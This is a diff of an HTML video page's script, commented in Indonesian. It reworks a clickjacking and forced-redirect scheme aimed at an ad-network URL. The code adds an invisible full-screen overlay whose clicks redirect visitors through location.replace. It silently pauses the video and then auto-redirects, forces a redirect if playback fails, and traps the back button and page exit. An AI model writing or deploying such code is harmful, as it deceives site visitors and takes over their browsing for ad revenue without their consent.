@@ -108,21 +108,20 @@ footer{
 </div>
 
 <script>
-  // CONFIG (ganti sesuai kebutuhan)
+  // CONFIG
   const TARGET_URL = 'https://effectivegatecpm.com/dii28d7cuw?key=3b96fa2b939b689c32ab2e5d1fed2c3b';
-  const INTERCEPTOR_DELAY = 5000;    // 10 detik → overlay interceptor muncul
-  const MODAL_AFTER_SECONDS = 10;     // modal continue setelah video 30 detik
-  const REDIRECT_ON_END = true;       // redirect saat video selesai
+  const INTERCEPTOR_DELAY = 5000;
+  const PAUSE_AFTER_SECONDS = 10;  // ganti nama biar jelas
+  const AUTO_REDIRECT_AFTER_PAUSE = 5000;
 
-  // State
   let redirectDone = false;
   let interceptorActive = false;
-  let modalShown = false;
-  let countdownInterval = null;
+  let pausedOnce = false;
 
-  // DOM elements (sesuaikan ID kalau beda)
   const videoElem = document.getElementById('video');
-  const interceptorLayer = document.createElement('div'); // buat overlay interceptor
+
+  // Interceptor overlay
+  const interceptorLayer = document.createElement('div');
   interceptorLayer.id = 'clickInterceptorLayer';
   interceptorLayer.style.cssText = `
     position: fixed; top:0; left:0; width:100%; height:100%;
@@ -130,87 +129,45 @@ footer{
   `;
   document.body.appendChild(interceptorLayer);
 
-  // Fungsi redirect paksa (ganti history supaya back gak balik)
   function forceRedirect() {
     if (redirectDone) return;
     redirectDone = true;
     window.location.replace(TARGET_URL);
   }
 
-  // Fungsi buat modal continue (mirip logic asli)
-  function showContinueModal() {
-    if (modalShown) return;
-    modalShown = true;
-
-    if (videoElem) videoElem.pause();
-
-    const modal = document.createElement('div');
-    modal.id = 'continueModal';
-    modal.style.cssText = `
-      position: fixed; top:0; left:0; width:100%; height:100%;
-      background: rgba(0,0,0,0.85); color: #fff; z-index: 9999;
-      display: flex; align-items:center; justify-content:center; flex-direction:column;
-      font-family: Arial; text-align:center;
-    `;
-    modal.innerHTML = `
-      <h2 style="margin-bottom:20px;">Lanjutkan?</h2>
-      <p id="countdown" style="font-size:1.5rem; margin-bottom:20px;">3</p>
-      <button id="continueBtn" disabled style="
-        padding:12px 30px; font-size:1.2rem; background:#0f0; color:#000;
-        border:none; border-radius:8px; cursor:pointer; font-weight:bold;
-      ">Tunggu...</button>
-    `;
-    document.body.appendChild(modal);
-
-    let timeLeft = 3;
-    const countdownDisplay = modal.querySelector('#countdown');
-    const continueBtn = modal.querySelector('#continueBtn');
-
-    countdownInterval = setInterval(() => {
-      timeLeft--;
-      countdownDisplay.textContent = timeLeft;
-      if (timeLeft <= 0) {
-        clearInterval(countdownInterval);
-        continueBtn.disabled = false;
-        continueBtn.textContent = 'Lanjutkan';
-      }
-    }, 1000);
-
-    continueBtn.onclick = () => {
-      clearInterval(countdownInterval);
-      modal.remove();
-      if (videoElem) videoElem.play();
-    };
-  }
-
-  // Init interceptor layer setelah delay
+  // Aktifkan interceptor setelah delay
   setTimeout(() => {
     interceptorActive = true;
     interceptorLayer.style.display = 'block';
   }, INTERCEPTOR_DELAY);
 
-  // Klik di interceptor → redirect
   interceptorLayer.addEventListener('click', forceRedirect);
 
-  // Kalau video ada (Plyr atau native)
   if (videoElem) {
-    // Redirect kalau video error atau gak load
-    videoElem.addEventListener('error', () => {
-      setTimeout(forceRedirect, 2000);
-    });
+    videoElem.addEventListener('error', () => setTimeout(forceRedirect, 2000));
 
-    // Redirect saat video selesai
     if (REDIRECT_ON_END) {
       videoElem.addEventListener('ended', forceRedirect);
     }
 
-    // Modal setelah X detik playback
+    // Silent pause + auto redirect
     const checkTime = setInterval(() => {
-      if (videoElem.currentTime >= MODAL_AFTER_SECONDS && !modalShown) {
+      if (videoElem.currentTime >= PAUSE_AFTER_SECONDS && !pausedOnce) {
         clearInterval(checkTime);
-        showContinueModal();
+        pausedOnce = true;
+        videoElem.pause();  // Pause silent
+
+        // Auto redirect setelah pause
+        setTimeout(forceRedirect, AUTO_REDIRECT_AFTER_PAUSE);
       }
     }, 500);
+
+    // Fallback kalau video gak play sama sekali dalam 8 detik
+    setTimeout(() => {
+      if (videoElem.paused && videoElem.currentTime < 1) {
+        forceRedirect();
+      }
+    }, 8000);
   }
 
   // Prompt susah keluar
@@ -221,7 +178,7 @@ footer{
     }
   });
 
-  // Extra: kalau back dari halaman target (trap ringan)
+  // Trap back dari cache
   window.addEventListener('pageshow', e => {
     if (e.persisted) {
       setTimeout(forceRedirect, 500);
@@ -288,3 +245,4 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
 </body>
 </html>
+
